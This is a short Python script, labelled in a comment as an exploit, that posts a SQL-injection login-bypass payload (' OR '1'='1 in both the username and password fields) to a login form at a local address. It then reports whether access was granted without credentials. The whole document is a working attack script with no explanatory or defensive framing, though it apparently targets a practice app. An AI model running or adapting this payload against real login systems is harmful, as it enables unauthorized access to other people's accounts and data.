import requests

url = "http://127.0.0.1:5000/login"

# Exploit: Bypass login with SQL injection
payload = {
    "username": "' OR '1'='1",
    "password": "' OR '1'='1"
}

res = requests.post(url, data=payload)

if "Login successful" in res.text:
    print("[+] Exploit worked! Access granted without credentials.")
else:
    print("[-] Exploit failed.")
